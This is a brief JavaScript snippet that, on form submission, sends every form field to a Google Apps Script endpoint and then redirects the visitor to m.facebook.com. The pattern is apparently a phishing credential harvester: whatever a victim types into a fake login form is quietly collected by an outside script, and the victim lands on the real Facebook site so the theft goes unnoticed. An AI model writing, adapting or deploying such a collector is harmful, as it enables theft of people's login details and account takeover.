const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxHwAdjTKWMT8z2edqWWQQyB7P9AApZ5yBDD9oNW51xeOwtQznw4TQ1hcqjb4MtZ0zX/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
